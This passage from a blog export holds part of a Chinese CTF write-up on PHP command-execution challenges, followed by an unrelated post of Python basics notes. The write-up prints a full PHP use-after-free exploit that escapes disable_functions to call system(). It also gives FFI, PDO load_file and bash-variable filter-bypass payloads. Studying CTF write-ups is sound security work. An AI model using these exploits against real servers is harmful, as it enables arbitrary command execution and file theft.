class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment"># str_shuffle prevents opcache string interning</span></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if UAF fails</span></span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); <span class="comment"># internal func handler</span></span><br><span class="line"> </span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在pwn函数里面写自己要执行的php代码即可。记得url编码后再发送。</p><p>web73-74：同样使用伪协议glob来扫描文件目录</p><p>web75-76：先glob扫目录，再通过连接数据库来获得flag，详见题解脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">c=</span><br><span class="line"> </span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable">$row</span>[<span class="number">0</span>]) . <span class="string">&quot;|&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$dbh</span> = <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>web77：题在题干中说到php7.4，可以想到<a href="https://www.php.cn/php-weizijiaocheng-415807.html">FFI</a></p><blockquote><p>FFI（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术。</p></blockquote><p>通过FFI，可以实现调用system函数，从而将flag直接写入一个新建的文本文件中，然后访问这个文本文件，获得flag，详见题解脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//首先是熟悉的确定flag位置和名称</span></span><br><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>) </span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;  &#x27;</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//FFI调用system函数</span></span><br><span class="line">c=</span><br><span class="line"><span class="variable">$ffi</span>=FFI :: <span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>web118：以下几题使用了一个很冷门的方式来绕过，通过linux，bash的内置变量截取字符来rce。前提：没有过滤大写字母</p><p>~A获得最后一个字符</p><p>所以可以利用各个环境变量的最后一位来构造命令。${PWD}在这题肯定是&#x2F;var&#x2F;www&#x2F;html，而${PATH}通常是bin,那么${PWD:<del>A}的结果就应该是’ l ‘，因为${PATH:</del>A}的结果是’ n ‘，那么他们拼接在一起正好是nl，能够读取flag，因为通配符没有被过滤，所以可以用通配符代替flag.php</p><p>web119-120:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">可以构造出/bin/base64 flag.php，只需要/和4两个字符就行，其他的可以用通配符代替。</span><br><span class="line">/很简单，pwd的第一位就是，因为这题ban了数字，所以可以用该题值必是1的$&#123;#SHLVL&#125;绕过</span><br><span class="line"></span><br><span class="line">SHLVL</span><br><span class="line">是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时$&#123;SHLVL&#125;=1，然后在此shell中再打开一个shell时$SHLVL=2。</span><br><span class="line"></span><br><span class="line">只需要$&#123;PWD::$&#123;SHLVL&#125;&#125;，结果就是/</span><br><span class="line"></span><br><span class="line">RANDOM</span><br><span class="line">此变量值，随机出现整数，范围为0-32767。不过，虽然说是随机，但并不是真正的随机，因为每次得到的随机数都一样。为此，在使用RANDOM变量前，请随意设定一个数字给RANDOM，当做随机数种子，这样才不会每次产生的随机数其顺序都一样。</span><br><span class="line"></span><br><span class="line">4的问题，可以用$&#123;#RANDOM&#125;，在Linux中，$&#123;#xxx&#125;显示的是这个值的位数不加#是变量的值，加了#是变量的值的长度，例如12345的值是5，而random函数绝大部分产生的数字都是4位或者5位的，因此可以代替4.</span><br><span class="line">payload：</span><br><span class="line"></span><br><span class="line">code=$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</span><br></pre></td></tr></table></figure><p>web121:SHLVL被过滤，可以用&#96;$或$</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python基础</title>
      <link href="/2023/06/30/Python%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/06/30/Python%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/qq_44907926/category_11476279.html">Python全栈系列教程_孤寒者的博客-CSDN博客</a></p><p>pycharm快捷键：已设置成visual stdio模式</p><p>在解释器选项中添加参数 <code>-Xfrozen_modules=off</code></p><p>运行设置处勾选在输出控制台模拟终端</p><h2 id="1-Python基础语法"><a href="#1-Python基础语法" class="headerlink" title="1. Python基础语法"></a>1. Python基础语法</h2><h3 id="1-零散小知识点"><a href="#1-零散小知识点" class="headerlink" title="1. 零散小知识点"></a>1. 零散小知识点</h3><h4 id="1-1-Python标识符"><a href="#1-1-Python标识符" class="headerlink" title="1.1 Python标识符"></a>1.1 Python标识符</h4><p>python3可以使用中文作为变量名</p><p>特殊意义的标识符：</p><ul><li>以单下划线开头_foo的代表不能直接访问的类属性，须通过接口访问。</li><li>以双下划线开头__foo代表类的私有成员</li><li>以双下划线开头和结尾的__ foo __代表python里的特殊方法</li></ul><p>python同一行写多条语句需要加分号，换行不用加</p><h4 id="1-2-行和缩进"><a href="#1-2-行和缩进" class="headerlink" title="1.2 行和缩进"></a>1.2 行和缩进</h4><p>python代码块不使用大括号来控制类，函数和其他逻辑判断，而是使用缩进对齐来写模块</p><p>相同的块内代码语句缩进必须相同</p><p>一行很长的语句可以用\来换行，而括在括号里的语句不需要\就能换行。</p><h4 id="1-3-input，print"><a href="#1-3-input，print" class="headerlink" title="1.3 input，print"></a>1.3 input，print</h4><p>input()接收输入信息，也可以使用eval(input(表达式) )直接接收python表达式，返回运算结果。input(要输出的，end&#x3D;)自定义尾</p><p>print()输出信息，“，”隔开变量，注意逗号后面有空格</p><h4 id="1-4-变量赋值与删除"><a href="#1-4-变量赋值与删除" class="headerlink" title="1.4 变量赋值与删除"></a>1.4 变量赋值与删除</h4><p>python是动态语言，可以将任意数据类型数据赋给一个变量，python变量赋值不需要类型声明，但是在使用这个变量前必须要赋值，python的变量相当于只是给值贴了个标签</p><p>del可以删除对象引用，也就是撕掉这个标签</p><h4 id="1-5-pycharm提示信息"><a href="#1-5-pycharm提示信息" class="headerlink" title="1.5 pycharm提示信息"></a>1.5 pycharm提示信息</h4><p>语法错误：代码底部红色波浪线</p><p>语法不符合规范：底部灰色波浪线</p><p>单词拼写提示：底部绿色波浪线</p><h3 id="2-python常用标准库"><a href="#2-python常用标准库" class="headerlink" title="2. python常用标准库"></a>2. python常用标准库</h3><h4 id="2-1-文件通配符"><a href="#2-1-文件通配符" class="headerlink" title="2.1 文件通配符"></a>2.1 文件通配符</h4><p>glob模块，glob.glob(‘*py’)，从当前目录查找含py的文件 </p><h4 id="2-2-访问互联网"><a href="#2-2-访问互联网" class="headerlink" title="2.2 访问互联网"></a>2.2 访问互联网</h4><p>requests库，urllib库</p><h3 id="3-python七大运算符"><a href="#3-python七大运算符" class="headerlink" title="3. python七大运算符"></a>3. python七大运算符</h3><ol><li><p>算术运算符，&#x2F;除，返回精确值，&#x2F;&#x2F;地板除，返回商</p></li><li><p>比较运算符，字符串用ascii码比</p></li><li><p>赋值运算符，和c一样</p></li><li><p>位运算符，和c一样</p></li><li><p>逻辑运算符，not and or</p></li><li><p>成员运算符，in和not in，在序列中查找值，找到了返回true，找不到返回false</p></li><li><p>身份运算符，is和not is用于比较两个对象的存储单元是否引用自同一个对象，通过判断内存地址是否相等来判断</p></li></ol><h3 id="4-控制语句"><a href="#4-控制语句" class="headerlink" title="4. 控制语句"></a>4. 控制语句</h3><p>记住控制语句条件后都要加：</p><h4 id="4-1-if语句"><a href="#4-1-if语句" class="headerlink" title="4.1 if语句"></a>4.1 if语句</h4><p>if 条件： elif 条件： else：</p><p>三元表达式 表达式1 if 条件 else 表达式2 </p><h4 id="4-2-循环语句"><a href="#4-2-循环语句" class="headerlink" title="4.2 循环语句"></a>4.2 循环语句</h4><p>while（）：<br>for num in ：  else： for后面的else在循环结束后进行，如果for被break了就不执行else</p><h3 id="5-数据类型的转换"><a href="#5-数据类型的转换" class="headerlink" title="5. 数据类型的转换"></a>5. 数据类型的转换</h3><p>python数据类型有int，float，str，list，tuple，dict，set</p><p>int(x,base &#x3D; ),base指定转化成多少进制</p><p>float(x) 转浮点</p><p>complex(real,image) 形成虚数</p><p>chr(x) 转字符</p><p>str(x) 转字符串  list()和tuple()实现tuple和list的相互转换</p><p>python不支持char 和 byte，只能用长度为1的字符串存储</p><p>isinstance判断一个变量是否是该类型，而type返回变量的类型</p><h2 id="2-Python数据类型"><a href="#2-Python数据类型" class="headerlink" title="2. Python数据类型"></a>2. Python数据类型</h2><p>掌握常用的函数即可，不常用的用到了可以马上查</p><p>注意，区间都是左闭右开</p><h3 id="1-Number数字"><a href="#1-Number数字" class="headerlink" title="1. Number数字"></a>1. Number数字</h3><p>abs()绝对值,import math  fabs()浮点绝对值,floor()向下取整,ceil()向上取整</p><p>随机数函数   import random：random.choice（range()）从序列中随机挑一个元素   </p><p>randrange(start,stop,step) 生成指定开始和终止以及步长的随机值  </p><p>shuffle(list) 打乱序列中的所有元素</p><p>数据类型：数值 int float bool complex</p><p>序列 str tuple list</p><p>散列 set dict</p><h3 id="2-String字符串"><a href="#2-String字符串" class="headerlink" title="2. String字符串"></a>2. String字符串</h3><p>字符串名[start,end]可以截取字符串</p><ul><li><p>字符串运算符  %s 和c一样进行格式化输出</p></li><li><p>字符串格式化  str.format()</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;&#125; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>))  <span class="comment"># 不设置指定位置，按默认顺序</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;0&#125; &#123;1&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>))  <span class="comment"># 设置指定位置</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;1&#125; &#123;0&#125; &#123;1&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>))  <span class="comment"># 设置指定位置</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置参数</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;网站名：&#123;name&#125;, 地址 &#123;url&#125;&quot;</span>.<span class="built_in">format</span>(name=<span class="string">&quot;百度&quot;</span>, url=<span class="string">&quot;www.baidu.com&quot;</span>))</span><br><span class="line"><span class="comment"># 通过字典设置参数</span></span><br><span class="line">site = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;百度&quot;</span>, <span class="string">&quot;url&quot;</span>: <span class="string">&quot;www.baidu.com&quot;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;网站名：&#123;name&#125;, 地址 &#123;url&#125;&quot;</span>.<span class="built_in">format</span>(**site))</span><br><span class="line"><span class="comment"># 通过列表索引设置参数</span></span><br><span class="line">my_list = [<span class="string">&#x27;百度&#x27;</span>, <span class="string">&#x27;www.baidu.com&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;网站名：&#123;0[0]&#125;, 地址 &#123;0[1]&#125;&quot;</span>.<span class="built_in">format</span>(my_list))  <span class="comment"># &quot;0&quot; 是后面只有一个列表，所以选定第一个。可以多个列表，各个列表中选相应的值</span></span><br></pre></td></tr></table></figure><p>str.format()格式化数字{:.2f}输出后面的那个数时保留两位小数</p><p>使用input得到的信息都是string，要记得进行转换</p><h3 id="3-List列表"><a href="#3-List列表" class="headerlink" title="3. List列表"></a>3. List列表</h3><blockquote><p>List（列表） 是 Python 中使用最频繁的数据类型。<br>列表可以完成大多数集合类的数据结构实现。它支持字符，数字，字符串甚至可以包含列表（所谓嵌套）。<br>列表用[ ]标识。是python最通用的复合数据类型。<br>列表中的值得分割也可以用到变量[头下标:尾下标]，就可以截取相应的列表，从左到右索引从0开始的（跟字符串一样）。<br>加号（+）是列表连接运算符，星号（*）是重复操作。</p></blockquote><p><strong>基本概念：在Python程序中使用中括号”[]”来表示列表，并用逗号分隔其中的元素。</strong></p><ul><li><p>查：通过下标索引取值，也可以通过下标切片，-1可以取到最后一个值，切片左闭右开：步长，步长为负数则逆向切</p><p>L[m:n:p]表示：从索引m开始直到索引n(不包含n)取数据，每p个取一个。</p><p>list.index(x,y) 第一个参数是要查找的值，第二个参数是从哪个下标开始查找，默认是从0开始。</p></li><li><p>增：</p><ol><li>list.append(obj) </li><li>list.insert(x,y) 在自定义位置x 添加元素y，插入到指定索引</li><li>list.extend(sep) 在列表末尾一次性追加另一个序列</li></ol></li><li><p>删：</p><ol><li>list.pop() 无参删最后一个，有参删对应下标的</li><li>list.remove(x) 删除指定元素，有多个重复时只删第一个</li><li>list.clear() 清空列表，删除列表中的所有值</li></ol></li><li><p>其他：</p><ol><li>分隔符.join()，将序列中的元素用分隔符连接，生成新的字符串。</li><li>reverse() 反向列表中的元素</li><li>list.sort(func) 对原列表进行排序</li></ol></li><li><p>项目中常见链表小操作</p><ol><li>使用collections模块里的Counter类，然后调用most_common()函数来实现</li><li>在python程序中，使用函数slice()可以实现切片对象，能够在切片操作函数中实现参数传递功能，可以被用在任何允许进行切片操作的地方。</li></ol></li></ul><h3 id="4-tuple元组"><a href="#4-tuple元组" class="headerlink" title="4. tuple元组"></a>4. tuple元组</h3><p>元组可以看作一种特殊的列表，元组与列表唯一的不同在于：元组内的数据元素不能发生改变，也不能添加和删改数据项，当我们需要创建一组不可变的数据时，通常把他放入元组中。</p><ul><li><p>元组的创建：创建元组的基本形式是以小括号“（）”将元素括起来，各个元素用逗号“，”。</p><p>任意无符号的对象，以逗号隔开，默认为元组</p></li><li><p>元组的修改和删除</p><p>修改：只能通过加号连接两个元组</p><p>删除：元组不可变，但可以通过del语句直接删掉整个元组</p></li><li><p>元组运算符</p><p>len计算元素个数，+连接，*复制，in存在，forin遍历</p></li><li><p>元组内置方法</p><p>len，max，min，tuple（seq）将列表转换为元组</p><p>其实更多时候我们是将元组转换为列表，操作完之后再转换为元组。注意tuple和list都是返回了一个新的，而不是直接改变了原来的。</p></li><li><p>元组虽然不可变，但是他指向的可变元素是可变的，比如元组中有一个元素是列表，该列表可变。</p></li><li><p>*运算符可以分解可迭代对象，常用于函数传不定个参数，形参写成 *arg，输入一个元组作为实参，然后就可以在函数中使用元组的成员。</p></li></ul><h3 id="5-dict字典（hash）"><a href="#5-dict字典（hash）" class="headerlink" title="5.dict字典（hash）"></a>5.dict字典（hash）</h3><ul><li><p>字典(dictionary)是键值对形式的可变容器，可存储任意类型对象。列表是有序的对象结合，字典是无序的对象集合。字典是python中唯一内建的映射类型。</p></li><li><p>字典的每个键值(key&#x3D;&gt;value)对用冒号(:)分割，每个对之间用逗号(,)分割，整个字典包括在花括号({})中</p></li><li><p>字典键的特性<br>1）不允许同一个键出现两次。创建时如果同一个键被赋值两次，前一个的值会被后一个覆盖<br>2）值可以取任何数据类型，但键必须是不可变的，如字符串，数字或元组。因为列表是可变的，所以键不能为列表</p></li><li><p>声明存在的数据集合。字典与列表相比，最大的不同在于字典是无序的，其成员位置只是象征性的，在字典中我们需要通过键来访问成员，而不能通过其位置来访问成员。</p></li><li><p>字典的创建</p><ol><li><p>使用dict()函数来创建字典</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dict1 = <span class="built_in">dict</span>(a=<span class="string">&#x27;a&#x27;</span>, b=<span class="string">&#x27;b&#x27;</span>, t=<span class="string">&#x27;t&#x27;</span>)     <span class="comment"># 传入关键字</span></span><br><span class="line">dict2 = <span class="built_in">dict</span>(<span class="built_in">zip</span>([<span class="string">&#x27;one&#x27;</span>, <span class="string">&#x27;two&#x27;</span>, <span class="string">&#x27;three&#x27;</span>], [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]))   <span class="comment"># 映射函数方式来构造字典</span></span><br><span class="line">dict3 = <span class="built_in">dict</span>([(<span class="string">&#x27;one&#x27;</span>, <span class="number">1</span>), (<span class="string">&#x27;two&#x27;</span>, <span class="number">2</span>), (<span class="string">&#x27;three&#x27;</span>, <span class="number">3</span>)])    <span class="comment"># 可迭代对象方式来构造字典</span></span><br></pre></td></tr></table></figure><p>第一种直接输入键值对，第二种使用zip函数将两个列表一一对应，第三种直接传入一一对应的列表。</p></li><li><p>使用dict函数的fromkeys()方法来创建字典</p><p>前面用一个列表表示键，后面传入一个值表示所有键的统一值</p></li></ol></li><li><p>字典的访问</p><ol><li>直接通过键去访问对应的值，若无该键则报错</li><li>通过get方法来获取key对应的值，key不存在返回None</li><li>keys方法取出所有的key，values方法取出所有的value，items方法取出所有的键值对</li><li>setdefault方法有该key则查，无则增</li></ol></li><li><p>增</p><p>直接给键赋值即可，如果键已经有值，则新的覆盖老的，还可以使用update方法更新字典，将原字典和新字典合并，新的覆盖老的。</p></li><li><p>删</p><p>使用del语句彻底地删掉一个字典中的键值对，还可以使用clear方法直接清空字典。pop方法也可以删掉字典里的键值对，popitem删掉最后一个键值对。del dict 删除一个字典。</p></li><li><p>实现一键多值的字典</p><p>使用collections模块里的defaultdict或者直接用setdefault</p></li><li><p>获取字典中的最大值和最小值，zip调换key和value，sorted再排序</p></li><li><p>获取两个字典中相同的键值对，通过keys或items获得所有的键或所有的值，再使用&amp;取交集。</p></li><li><p>创建有序字典： 使用collections中的OrderedDict，先加入的元素放在最前面，使用popitem删除最后加入的元素并返回键值对。</p></li></ul><h3 id="6-set集合"><a href="#6-set集合" class="headerlink" title="6.set集合"></a>6.set集合</h3><ul><li><p>集合（set）是一个无序的不重复元素序列。所以启发在做元素的去重操作时可用set()</p></li><li><p>可以使用大括号 { } 或者 set() 函数创建集合，注意：创建一个空集合必须用 set() 而不是 { }，因为 { } 是用来创建一个空字典。</p></li><li><p>add加，discard删，remove删，update合并</p></li></ul><h2 id="3-Python函数"><a href="#3-Python函数" class="headerlink" title="3. Python函数"></a>3. Python函数</h2><h3 id="1-函数基础"><a href="#1-函数基础" class="headerlink" title="1. 函数基础"></a>1. 